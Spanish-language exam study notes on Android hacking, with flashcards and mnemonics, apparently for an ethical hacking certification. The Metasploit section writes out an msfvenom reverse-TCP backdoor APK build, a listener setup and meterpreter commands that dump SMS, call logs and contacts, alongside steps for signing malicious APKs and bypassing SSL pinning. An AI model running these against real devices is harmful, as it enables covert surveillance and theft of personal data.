# M17_02 — Hacking Android OS
**Módulo 17 / Subapartado 2 — Hacking Android OS**

---

## 1. Conceptos y definiciones

### Arquitectura Android — 5 capas / 6 secciones 🔴

Android es un OS basado en Linux kernel. Su arquitectura se organiza en **5 capas** que contienen **6 secciones**:

| Capa (de arriba a abajo) | Sección(es) | Componentes clave |
|--------------------------|-------------|-------------------|
| 1 — Aplicaciones | System Apps | Dialer, email, cámara, SMS, browser, contactos |
| 2 — Framework | Java API Framework | Content Providers, View System, Activity Manager, Location Manager, Package Manager, Notification Manager, Resource Manager, Telephony Manager, Window Manager |
| 3 — Librerías + Runtime | Native C/C++ Libraries + Android Runtime | WebKit/Blink, OpenGL\|ES, SQLite, SSL, Media Framework, Libc, FreeType, Surface Manager + ART (AOT, JIT, GC, DEX) |
| 4 — Abstracción HW | Hardware Abstraction Layer (HAL) | Módulos: audio, cámara, Bluetooth, sensores |
| 5 — Kernel | Linux Kernel | Drivers: audio, binder (IPC), display, keypad, Bluetooth, cámara, USB, Wi-Fi, Flash memory, power management |

**Android Runtime (ART)** — para Android ≥ 5.0:
- AOT (Ahead-of-Time) compilation
- JIT (Just-in-Time) compilation
- Garbage Collection optimizado
- Formato DEX (Dalvik Executable) para comprimir código máquina

**Opciones de almacenamiento persistente en Android:**
- Shared Preferences → datos primitivos privados en pares clave-valor
- Internal Storage → datos privados en memoria del dispositivo
- External Storage → datos públicos en almacenamiento externo compartido
- SQLite Databases → datos estructurados en BBDD privada
- Network Connection → datos en servidor de red propio

---

### Android Device Administration API 🔴

API que proporciona funcionalidades de administración a nivel de sistema. Permite a desarrolladores crear apps de seguridad para entornos corporativos (email clients, remote wipe, device management).

**Políticas soportadas con datos numéricos específicos:**

| Política | Detalle |
|----------|---------|
| Password enabled | Exige PIN/contraseña |
| Minimum password length | Número mínimo de caracteres (ej. mínimo 6) |
| Alphanumeric password required | Combinación de letras + números + opcionales símbolos |
| Complex password required | Mínimo letra + dígito numérico + símbolo especial — **introducido en Android 3.0** |
| Minimum letters/lowercase/non-letter/digits/symbols/uppercase | Todos introducidos en **Android 3.0** |
| Password expiration timeout | Expresado como delta en milisegundos — **Android 3.0** |
| Password history restriction | Impide reutilizar las últimas n contraseñas únicas — **Android 3.0** |
| Maximum failed password attempts | Tras alcanzar el límite → wipe del dispositivo; admins pueden hacer remote factory reset |
| Maximum inactivity time lock | Valor entre **1 y 60 minutos**; el dispositivo bloquea pantalla si el usuario no interactúa |
| Require storage encryption | **Android 3.0** |
| Disable camera | Deshabilitable dinámicamente según contexto/tiempo — **Android 4.0** |

**Acciones adicionales permitidas por la API:**
- Prompt user to set a new password
- Lock device immediately
- Wipe the device's data (factory defaults)

---

### Android Rooting

**Definición:** obtención de control privilegiado (root access) dentro del subsistema Android para superar las restricciones impuestas por fabricantes y operadores.

**Proceso técnico:**
1. Explotar vulnerabilidades de seguridad en el firmware del dispositivo
2. Copiar el binario `su` a una ubicación en el PATH del proceso actual (ej. `/system/xbin/su`)
3. Otorgar permisos de ejecución con el comando `chmod`

**Capacidades desbloqueadas por el rooting:**
- Modificar/eliminar aplicaciones del sistema, módulos, ROMs y kernels
- Eliminar bloatware (apps preinstaladas por fabricante/operador)
- Acceso de bajo nivel al hardware no disponible por defecto
- Mejora de rendimiento, tethering Wi-Fi/Bluetooth
- Instalar apps en SD card, instalar ROMs personalizados

**Riesgos del rooting:**
- Anulación de garantía
- Rendimiento degradado
- Infección por malware
- "Bricking" del dispositivo (inutilización)

**Herramientas de rooting:** KingoRoot, One Click Root, TunesGo, RootMaster, Magisk Manager, KingRoot, iRoot.

**KingoRoot — pasos con PC:** instalar herramienta en PC → conectar dispositivo por USB → habilitar USB debugging → instalar drivers → clic en ROOT.
**KingoRoot — pasos sin PC:** habilitar "instalación desde fuentes desconocidas" → descargar KingoRoot.apk → instalar y lanzar → "One Click Root".

---

### drozer — Identificación de superficies de ataque

drozer identifica vulnerabilidades y superficies de ataque en apps y dispositivos Android. No requiere USB debugging; funciona en estado de producción. Componentes: **drozer agent** (emulador para testing) + **drozer console** (CLI).

**Comandos clave:**

```
dz> run app.package.list                          # Lista todos los packages del dispositivo
dz> run app.package.list -f <string_name>         # Filtra packages por nombre
dz> run app.package.info -a <package_name>        # Detalles básicos del package
dz> run app.package.attacksurface <package_name>  # Lista actividades exportadas (superficies de ataque)
dz> run app.activity.info -a <package_name>       # Detalles de actividades exportadas
dz> run app.activity.start --component <package_name> <activity_name>  # Lanza una actividad
```

La ejecución de `app.activity.start` puede mostrar información crítica que permite **evadir el proceso de autenticación**.

---

### ADB (Android Debug Bridge) y PhoneSploit Pro

ADB es una herramienta CLI que permite comunicación con dispositivos Android: instalar/depurar apps, acceder a Unix shell, ejecutar comandos directamente.

**Puerto por defecto:** TCP **5555** (para conectividad inalámbrica ADB).

**Comandos ADB relevantes:**

```bash
adb tcpip 5555                          # Configura el dispositivo para escuchar TCP/IP en puerto 5555
adb connect <device_ip_address>         # Conecta al dispositivo por Wi-Fi
adb devices                             # Confirma la conexión
adb shell                               # Abre shell en el dispositivo
adb shell pm list packages              # Lista todos los packages instalados
adb shell pm list packages -3 -f        # Lista solo apps de terceros
adb logcat > logcat.log                 # Almacena logs del dispositivo en fichero .log
```

**Frida** — herramienta para análisis dinámico:
```bash
frida-ps -Uai    # Lista apps instaladas en dispositivo USB (-a: todas, -i: instaladas, -U: USB)
frida -U -l <Hooking_file.js> -f <package_name>  # Hooking de código JavaScript en app Android
```

**apktool** — descompilado/recompilado de APKs:
```bash
apktool d <App_package>.apk   # Descompila APK (genera AndroidManifest.xml, smali, assets, etc.)
apktool b <app_directory>     # Recompila el código fuente modificado
```

**Firma de APK malicioso:**
```bash
# Crear certificado de firma personalizado
keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000

# Firmar el APK malicioso
apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious_file>.apk
```

**PhoneSploit Pro** — explotación de dispositivos con TCP debugging habilitado en puerto 5555. Permite: captura de pantalla, dump de info del sistema, ver apps en ejecución, port forwarding, instalar/desinstalar apps, activar/desactivar Wi-Fi.

---

### Metasploit — Explotación de Android 🔴

```bash
# Buscar exploits y payloads para Android
msf > search type:exploit platform:android
msf > search type:payload platform:android

# Generar payload personalizado (reverse TCP meterpreter)
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik \
  LHOST=<IP_Local> R > Desktop/Backdoor.apk

# Configurar listener
msf > use exploit/multi/handler
msf > set PAYLOAD android/meterpreter/reverse_tcp
msf > set LHOST <IP_Local>
msf > set LPORT <Puerto>
msf > exploit

# Comandos meterpreter para extracción de datos
sysinfo          # Verificar el dispositivo Android
ipconfig         # Información de red
pwd              # Directorio actual
ps               # Procesos en ejecución
dump_sms         # Volcar SMS
dump_calllog     # Volcar registro de llamadas
dump_contacts    # Volcar contactos
webcam_list      # Listar cámaras disponibles
```

El payload genera un fichero `.apk` que actúa como backdoor; se necesita un listener activo en el sistema atacante para establecer la conexión.

---

### Man-in-the-Disk (MITD) Attack

MITD es una variante de MITM específica de Android. Explota el hecho de que el **almacenamiento externo no está sandboxed** (a diferencia del almacenamiento interno, que sí lo está), permitiendo la compartición de ficheros entre apps.

**Flujo del ataque:**
1. La víctima descarga e instala una app legítima desde la tienda oficial
2. La app recibe una actualización y descarga el código del servidor cloud
3. La víctima concede permiso a la app para acceder al almacenamiento externo → el código descargado se almacena en el almacenamiento externo
4. El atacante monitoriza remotamente el almacenamiento externo e inyecta código malicioso en el update
5. La app legítima obtiene y ejecuta el código de actualización manipulado
6. El código malicioso solicita e instala automáticamente una app fraudulenta del atacante
7. Con la app maliciosa, el atacante roba información sensible o toma control total del dispositivo

**Diferencia clave:** interno → sandboxed; externo → compartido y vulnerable.

---

### Spearphone Attack

Explota el **acelerómetro** (sensor de movimiento de firmware), que cualquier app puede acceder **sin permisos especiales**. Las reverberaciones de voz del altavoz se transmiten a través de la superficie del dispositivo y son captadas por el acelerómetro. Permite:
- Espiar conversaciones del altavoz entre usuarios remotos
- Monitorizar salida de voz de asistentes virtuales, mensajes multimedia, ficheros de audio
- Identificación de habla/locutor y clasificación de género mediante reconocimiento de voz

---

### Factory Reset Protection (FRP) Bypass — 4ukey

FRP es una función de seguridad de Android que previene el acceso no autorizado a dispositivos perdidos o robados. Herramientas como **4ukey** y **Octoplus FRP** permiten bypassearlo.

Tras el bypass exitoso: acceso a datos personales (contactos, mensajes, fotos), instalación de malware, acceso a cuentas sensibles.

---

### Tap 'n Ghost Attack

Ataque que explota dispositivos Android con **NFC**. Basado en dos técnicas:
- **TAP (Tag-based Adaptive Ploy):** usa NFC para hacer que el dispositivo visite una URL específica sin consentimiento del usuario mediante un emulador de tag NFC. Funciona con un servidor web que usa device fingerprinting.
- **Ghost Touch Generator:** fuerza a la víctima a tocar el botón "cancelar" que en realidad ejecuta la función de "permitir", engañando al usuario para que conceda acceso remoto al smartphone.

También aplicable a máquinas de votación y cajeros automáticos (ATMs).

---

### Bypass de SSL Pinning

SSL pinning obliga a la app a operar solo con certificados y claves públicas de confianza, previniendo MITM. Se puede bypass mediante:

**Reverse Engineering (Apktool):**
1. `apktool d <app.apk>` → descompila; genera smali, assets, lib, res, AndroidManifest.xml
2. En el código **smali** (assembler de Dalvik VM), localizar funciones `checkClientTrusted` y `checkServerTrusted` que procesan certificados X.509
3. Modificar la salida de estas funciones para bypass el SSL pinning
4. `apktool b <directorio>` → recompila

**Hooking (Frida):**
- Frida inyecta código malicioso y manipula el comportamiento en tiempo de ejecución
- `frida -U -l <Hooking_file.js> -f <package_name>`
- También aplicable a apps iOS

---

### Advanced SMS Phishing (OTA Provisioning Attack)

Explota el proceso **OTA (Over-the-Air) provisioning**, mecanismo legítimo que operadores usan para enviar datos de configuración y actualizaciones de forma remota. Debilidades: métodos de autenticación débiles.

Requiere el **IMSI** (International Mobile Subscriber Identity) de la víctima. Sin IMSI: se envían dos mensajes (primero con PIN aparentemente del operador, segundo con el mensaje malicioso autenticado con ese PIN).

Afecta principalmente a dispositivos Samsung, Huawei, LG y Sony. Usa un módem USB de bajo coste. Puede modificar servidores de mensajes, correo, directorio y proxies del dispositivo.
Mitigación: **Harmony Mobile**.

---

### zANTI y Kali NetHunter

**zANTI** (app Android para pentesting de red): spoofing de MAC, hotspot Wi-Fi malicioso, escaneo de puertos abiertos, explotar vulnerabilidades de router, auditorías de contraseñas, MITM, DoS, modificar/redirigir peticiones HTTP/HTTPS, insertar HTML, hijacking de sesiones, capturar/interceptar descargas.

**Kali NetHunter:** suite completa para ataques desde Android. Soporta: ataques de teclado HID, BadUSB attacks, evil AP MANA attacks, generación de payloads personalizados con Metasploit.

---

### Herramientas clave — mapa rápido

| Herramienta | Propósito |
|-------------|-----------|
| drozer | Identificar superficies de ataque en apps Android |
| PhoneSploit Pro | Explotar dispositivos con ADB TCP (puerto 5555) |
| AndroRAT | RAT Android con backdoor persistente; arranca con el dispositivo; Java (cliente) + Python (servidor) |
| Ghost Framework | Post-explotación vía ADB sin OpenSSH; dump de logs, apps, MAC, batería, red |
| zANTI | Pentesting de red desde Android |
| Kali NetHunter | Suite de ataques móviles con payloads Metasploit |
| LOIC (Android) | DoS/DDoS: UDP, HTTP o TCP flood; control de flujo de tráfico |
| Orbot Proxy | Anonimización mediante Tor; encripta tráfico y lo rebota por múltiples nodos |
| PCAPdroid | Sniffer Android open-source; captura tráfico simulando VPN; **sin root** |
| MobSF | Análisis estático y dinámico de APK, XAPK, APPX, IPA |
| Apktool | Descompilar/recompilar APKs; decodifica AndroidManifest.xml |
| Frida | Análisis dinámico, hooking, bypass SSL pinning |
| apksigner | Firma de APKs con certificado personalizado |

---

### Android Malware destacado

- **Mamont** → Banking Trojan que se disfraza de Chrome; distribuido por phishing/spam; solicita permisos de llamadas + SMS; engaña con premio falso; instruye al usuario a no desinstalar en 24h para prolongar la infección.
- SecuriDropper, Dwphon, DogeRAT, Tambir, SoumniBot.

---

## 2. Exam Traps ⚠️ 🔴

⚠️ **[Android arquitectura — número de capas vs secciones]** El examen puede preguntar "cuántas capas tiene la arquitectura Android". La respuesta es **5 capas** conteniendo **6 secciones** (Native C/C++ Libraries y Android Runtime cuentan como secciones separadas en la misma capa).

⚠️ **[ART vs Dalvik]** ART es el runtime de Android **desde la versión 5.0**. Dalvik fue su predecesor. El examen puede preguntar qué runtime usa Android moderno: **ART**. Smali es el assembler de **Dalvik VM** (aunque ART también usa el formato DEX).

⚠️ **[Puerto ADB]** El puerto para conectividad inalámbrica ADB es **TCP 5555**. Si el examen menciona "TCP debugging habilitado" en un dispositivo Android, el puerto es 5555.

⚠️ **[Rooting — proceso técnico]** El examen puede preguntar qué binario se copia en el PATH durante el rooting: **`su`** (en `/system/xbin/su`) seguido de `chmod` para otorgar permisos de ejecución.

⚠️ **[MITD vs MITM]** MITD (Man-in-the-Disk) es una variante de MITM específica de Android que explota el **almacenamiento externo no sandboxed**. El vector no es la red sino la modificación del código de actualización en el almacenamiento externo.

⚠️ **[Spearphone — permiso requerido]** El acelerómetro puede ser accedido por cualquier app **sin permisos especiales**. Si el examen pregunta qué permiso necesita el Spearphone attack: **ninguno**.

⚠️ **[Device Administration API — versiones Android]** Todas las políticas de complejidad de contraseña avanzadas (complex password, minimum letters, uppercase, lowercase, digits, symbols, non-letter, expiration, history, storage encryption) fueron introducidas en **Android 3.0**. La política de **disable camera** es de **Android 4.0**.

⚠️ **[Maximum inactivity time lock — rango]** El rango válido es entre **1 y 60 minutos**. Si el examen presenta un valor fuera de este rango, no es válido.

⚠️ **[AndroRAT — lenguajes]** Cliente en **Java Android**, servidor en **Python**. Inicia automáticamente en el arranque del dispositivo (persistencia).

⚠️ **[PCAPdroid — root requerido]** PCAPdroid captura tráfico de red **sin requerir root** (simula una VPN). No confundir con otros sniffers que sí requieren root.

⚠️ **[SSL pinning bypass — función smali a modificar]** Las funciones clave son `checkClientTrusted` y `checkServerTrusted`, que manejan certificados X.509. No son nombres genéricos sino funciones específicas de la implementación de SSL pinning.

⚠️ **[Tap 'n Ghost — tecnología explotada]** Explota **NFC** y los **electrodos RX de la pantalla táctil capacitiva**. No es un ataque Bluetooth ni Wi-Fi, aunque puede usar estos para la conexión remota posterior.

---

## 3. Nemotécnicos

### Arquitectura Android — capas de arriba a abajo
**"SJNA-HL"**: **S**ystem Apps → **J**ava API Framework → **N**ative C/C++ Libraries → **A**ndroid Runtime → **H**AL → **L**inux Kernel

Mnemónico: "**S**iempre **J**ugamos **N**uestra **A**ventura **H**acia **L**a base"

### 5 opciones de almacenamiento Android
**"SISEN"**: **S**hared Preferences → **I**nternal Storage → **S**QLite Databases → **E**xternal Storage → **N**etwork Connection

### Riesgos del rooting (4)
**"VPMB"**: **V**oid warranty → **P**oor performance → **M**alware infection → **B**ricking

### Políticas Android 3.0 (recordar que todas las avanzadas son 3.0 excepto disable camera = 4.0)
Regla: **"3.0 = todo sobre contraseña + encryption"**, **"4.0 = cámara"**

### Comandos meterpreter Android (extracción de datos)
**"SCC-PSI-DDD-W"** → `sysinfo`, `ipconfig`, `pwd`, `ps` → info del sistema; `dump_sms`, `dump_calllog`, `dump_contacts` → datos personales; `webcam_list` → cámara

### MITD — 7 pasos (simplificados)
**"Descarga → Permiso → Monitoriza → Inyecta → Ejecuta → Instala → Roba"**

### Tap 'n Ghost — dos técnicas
**"TAG"**: **T**AP (Tag-based Adaptive Ploy) + Ghost Touch Generator

---

## 4. Flashcards

**Q:** ¿Cuál es el proceso técnico de rooting en Android a nivel de sistema?
**A:** Explotar vulnerabilidades en el firmware → copiar el binario `su` a una ubicación en el PATH del proceso (ej. `/system/xbin/su`) → otorgar permisos de ejecución con `chmod`.

---

**Q:** ¿Qué puerto TCP usa ADB para conectividad inalámbrica y qué herramienta explota esta conexión?
**A:** Puerto **TCP 5555**. La herramienta **PhoneSploit Pro** explota dispositivos con TCP debugging habilitado en este puerto.

---

**Q:** ¿Qué diferencia el almacenamiento interno del externo en Android en términos de seguridad?
**A:** El almacenamiento interno está **sandboxed** (privado por app). El almacenamiento externo es compartido entre apps y **no está sandboxed**, haciéndolo vulnerable a ataques MITD.

---

**Q:** ¿Qué es un ataque Man-in-the-Disk (MITD) y qué vulnerabilidad explota?
**A:** Variante de MITM que intercepta y manipula el código de actualizaciones de apps almacenado en el almacenamiento externo de Android. Explota que el almacenamiento externo no está sandboxed.

---

**Q:** ¿Qué permisos necesita una app maliciosa para ejecutar un Spearphone attack?
**A:** Ninguno. El acelerómetro puede ser accedido por cualquier app sin permisos especiales.

---

**Q:** ¿Qué mecanismo de seguridad se elimina al hacer jailbreak en iOS pero NO necesariamente al hacer rooting en Android?
**A:** Las **restricciones del sandbox**. El jailbreaking iOS elimina explícitamente el sandbox. El rooting Android obtiene root access pero no elimina el sandbox de la misma forma.

---

**Q:** ¿Cuál es el comando drozer para identificar la superficie de ataque de un package?
**A:** `dz> run app.package.attacksurface <package_name>` — lista actividades exportadas y otros componentes expuestos.

---

**Q:** ¿Qué es ART y qué características tiene que diferencian de su predecesor Dalvik?
**A:** Android Runtime (ART), usado desde Android **≥ 5.0**. Características: AOT compilation, JIT compilation, GC optimizado, formato DEX. Dalvik era el runtime previo (sin AOT).

---

**Q:** ¿Qué hace el comando `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<IP> R > Backdoor.apk`?
**A:** Genera un payload de backdoor Android (fichero `.apk`) que establece una conexión reverse TCP con meterpreter hacia el atacante. Requiere un listener activo en el sistema atacante.

---

**Q:** ¿Qué herramienta realiza análisis estático y dinámico de APK/XAPK/APPX/IPA?
**A:** **MobSF** (Mobile Security Framework) — automatiza análisis de malware extrayendo permisos, actividades navegables y certificados de firma.

---

**Q:** ¿Qué es el Tap 'n Ghost attack y qué dos técnicas lo componen?
**A:** Ataque que explota dispositivos Android con NFC y electrodos RX de pantalla táctil capacitiva. Componentes: **TAP** (Tag-based Adaptive Ploy) para visitar URLs via NFC sin consentimiento + **Ghost Touch Generator** para engañar al usuario con el botón cancelar/permitir.

---

**Q:** ¿Qué información obtiene el módulo drozer `app.activity.start`?
**A:** Lanza una actividad exportada que puede mostrar información crítica permitiendo **evadir el proceso de autenticación** de la app.

---

**Q:** ¿Qué hace Orbot Proxy y por qué lo usan los atacantes?
**A:** Usa **Tor** para cifrar el tráfico de Internet y rebotarlo por múltiples nodos alrededor del mundo, ocultando la identidad del atacante mientras realiza ataques o navega por aplicaciones objetivo.

---

**Q:** ¿Qué funciones smali busca un atacante al hacer bypass de SSL pinning con Apktool?
**A:** `checkClientTrusted` y `checkServerTrusted`, funciones que procesan certificados **X.509** con la clave pública del usuario. Modificar su salida permite bypass el SSL pinning.

---

**Q:** ¿En qué versión de Android se introdujo la política "Disable Camera" en la Device Administration API?
**A:** **Android 4.0**. Todas las políticas de complejidad de contraseña avanzadas son de Android 3.0; la de cámara es de Android 4.0.

---

**Q:** ¿Qué característica distingue a AndroRAT como RAT Android?
**A:** Proporciona un backdoor persistente completo porque la app **arranca automáticamente al encender el dispositivo**. Arquitectura cliente/servidor: Java Android (cliente) + Python (servidor).

---

**Q:** ¿Qué explota el Advanced SMS Phishing attack (OTA) y qué dato del objetivo necesita el atacante?
**A:** Explota el mecanismo **OTA (Over-the-Air) provisioning** con autenticación débil. El atacante necesita el **IMSI** (International Mobile Subscriber Identity) de la víctima. Sin IMSI, envía dos mensajes: primero un PIN falso del operador, luego el mensaje malicioso autenticado con ese PIN.

---

**Q:** ¿Qué comando ADB lista únicamente las apps de terceros instaladas en un dispositivo?
**A:** `adb shell pm list packages -3 -f`

---

**Q:** ¿Cuál es el rango válido para la política "Maximum inactivity time lock" en la Device Administration API?
**A:** Entre **1 y 60 minutos**.

---

## 5. Confusión frecuente

### Android Rooting vs iOS Jailbreaking
- **Rooting (Android):** obtiene root access en el subsistema Android; no elimina explícitamente el sandbox; técnicamente copia el binario `su` + `chmod`.
- **Jailbreaking (iOS):** elimina los mecanismos de seguridad de Apple, proporciona root access Y **elimina las restricciones del sandbox**.
- **Criterio:** ¿sandbox eliminado explícitamente? → Jailbreaking. ¿Root access en Android? → Rooting.

---

### MITM vs MITD (Man-in-the-Disk)
- **MITM:** intercepción de comunicaciones de **red** entre dos sistemas.
- **MITD:** intercepción y manipulación del **almacenamiento externo** de Android; específico de actualizaciones de apps que usan external storage.
- **Criterio:** ¿tráfico de red? → MITM. ¿Código de actualización en almacenamiento externo Android? → MITD.

---

### ART vs Dalvik
- **Dalvik:** runtime de Android pre-5.0; usa compilación JIT solo; formato DEX.
- **ART (Android Runtime):** runtime desde Android ≥ 5.0; AOT + JIT + GC optimizado + DEX.
- **Criterio:** si el examen pregunta el runtime de Android moderno → ART. Smali es el assembler de Dalvik VM (pero ART también lo puede usar por compatibilidad con DEX).

---

### drozer vs Frida
- **drozer:** enumera superficies de ataque, packages, actividades exportadas de apps Android; interacción con el framework de la app.
- **Frida:** análisis dinámico en tiempo de ejecución; hooking de funciones; inyección de código JavaScript; bypass de SSL pinning; funciona también en iOS.
- **Criterio:** ¿enumerar componentes de la app? → drozer. ¿Modificar comportamiento en tiempo de ejecución? → Frida.

---

### PCAPdroid vs otros sniffers Android
- **PCAPdroid:** captura tráfico simulando una VPN; **no requiere root**; procesa datos localmente sin servidor remoto; open-source.
- **Otros sniffers (Sniffer Wicap 2, Intercepter-NG):** generalmente requieren root para captura completa de tráfico.
- **Criterio:** ¿sniffer Android sin root? → PCAPdroid.

---

### Ghost Framework vs AndroRAT
- **Ghost Framework:** post-explotación vía **ADB** (Android Debug Bridge) sin necesidad de OpenSSH; port forwarding, dump de info del sistema.
- **AndroRAT:** RAT clásico con backdoor persistente; arranca con el dispositivo; cliente Java Android + servidor Python; obtiene ubicación, datos SIM, IP, MAC.
- **Criterio:** ¿explotación via ADB? → Ghost Framework. ¿RAT persistente que arranca con el boot? → AndroRAT.
